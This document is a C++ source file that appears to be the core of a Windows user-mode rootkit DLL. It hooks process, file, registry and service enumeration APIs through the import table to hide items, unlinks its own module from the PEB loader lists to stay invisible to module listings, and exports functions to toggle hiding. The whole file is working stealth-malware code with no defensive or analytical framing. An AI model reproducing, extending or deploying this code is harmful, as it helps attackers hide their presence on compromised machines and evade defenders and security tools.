#include <Windows.h>

#include <intrin.h>

#include "config.h"
#include "hooks.h"
#include "iat_hook.h"
#include "rootkit.h"

namespace
{
	PPEB GetCurrentPeb()
	{
#if defined(_M_X64)
		return reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
		return reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
	}

	// RemoveEntryList is kernel-only, so unlink the entry manually.
	void RemoveListEntry(LIST_ENTRY* lpEntry)
	{
		lpEntry->Blink->Flink = lpEntry->Flink;
		lpEntry->Flink->Blink = lpEntry->Blink;
	}

	// Unlink the DLL from the three PEB loader lists so that it disappears
	// from EnumProcessModules / module snapshots.
	void HideModuleFromPeb(const HMODULE hModule)
	{
		const PPEB lpPeb = GetCurrentPeb();
		if (lpPeb == nullptr || lpPeb->Ldr == nullptr)
			return;

		LIST_ENTRY* lpHead = &lpPeb->Ldr->InLoadOrderModuleList;
		for (LIST_ENTRY* lpLink = lpHead->Flink; lpLink != lpHead; lpLink = lpLink->Flink)
		{
			const auto lpModule = CONTAINING_RECORD(lpLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
			if (lpModule->DllBase != hModule)
				continue;

			RemoveListEntry(&lpModule->InLoadOrderLinks);
			RemoveListEntry(&lpModule->InMemoryOrderLinks);
			RemoveListEntry(&lpModule->InInitializationOrderLinks);
			return;
		}
	}

	// Restore an entry in an IAT, if the original function was captured.
	void RestoreHook(LPCSTR lpModuleName, LPCSTR lpFunctionName, LPVOID lpOriginal, LPCSTR lpTargetModuleName = nullptr)
	{
		if (lpOriginal == nullptr)
			return;

		if (lpTargetModuleName != nullptr)
			IAT::Hook(lpModuleName, lpFunctionName, lpOriginal, lpTargetModuleName);
		else
			IAT::Hook(lpModuleName, lpFunctionName, lpOriginal);
	}
}

DWORD WINAPI InitHook(LPVOID lpParam)
{
	const HMODULE hModule = static_cast<HMODULE>(lpParam);

	Config::Initialize(hModule);

	OriginalNtQuerySystemInformation = (pNtQuerySystemInformation) IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &HookedNtQuerySystemInformation);
	OriginalNtQueryDirectoryFile = (pNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &HookedNtQueryDirectoryFile, "windows.storage.dll");
	OriginalNtOpenProcess = (pNtOpenProcess) IAT::Hook("ntdll.dll", "NtOpenProcess", &HookedNtOpenProcess);

	// Registry enumeration: patch the main module and advapi32 (used by the
	// Reg* APIs) so tools like regedit are covered too.
	{
		const LPVOID lpMainModule = IAT::Hook("ntdll.dll", "NtEnumerateKey", &HookedNtEnumerateKey);
		const LPVOID lpAdvapi32 = IAT::Hook("ntdll.dll", "NtEnumerateKey", &HookedNtEnumerateKey, "advapi32.dll");
		OriginalNtEnumerateKey = static_cast<pNtEnumerateKey>(lpMainModule != nullptr ? lpMainModule : lpAdvapi32);
	}
	{
		const LPVOID lpMainModule = IAT::Hook("ntdll.dll", "NtEnumerateValueKey", &HookedNtEnumerateValueKey);
		const LPVOID lpAdvapi32 = IAT::Hook("ntdll.dll", "NtEnumerateValueKey", &HookedNtEnumerateValueKey, "advapi32.dll");
		OriginalNtEnumerateValueKey = static_cast<pNtEnumerateValueKey>(lpMainModule != nullptr ? lpMainModule : lpAdvapi32);
	}

	OriginalEnumServicesStatusExW = (pEnumServicesStatusExW) IAT::Hook("advapi32.dll", "EnumServicesStatusExW", &HookedEnumServicesStatusExW);

	HideModuleFromPeb(hModule);

	ExitThread(0);
}

void RemoveHookAndFreeLibrary(const HMODULE hModule)
{
	RestoreHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)OriginalNtQuerySystemInformation);
	RestoreHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)OriginalNtQueryDirectoryFile, "windows.storage.dll");
	RestoreHook("ntdll.dll", "NtOpenProcess", (LPVOID)OriginalNtOpenProcess);
	RestoreHook("ntdll.dll", "NtEnumerateKey", (LPVOID)OriginalNtEnumerateKey);
	RestoreHook("ntdll.dll", "NtEnumerateKey", (LPVOID)OriginalNtEnumerateKey, "advapi32.dll");
	RestoreHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)OriginalNtEnumerateValueKey);
	RestoreHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)OriginalNtEnumerateValueKey, "advapi32.dll");
	RestoreHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID)OriginalEnumServicesStatusExW);

	FreeLibraryAndExitThread(hModule, 0);
}

extern "C" __declspec(dllexport) void EnableHiding()
{
	Config::SetEnabled(true);
}

extern "C" __declspec(dllexport) void DisableHiding()
{
	Config::SetEnabled(false);
}

extern "C" __declspec(dllexport) BOOL IsHidingEnabled()
{
	return Config::IsEnabled() ? TRUE : FALSE;
}
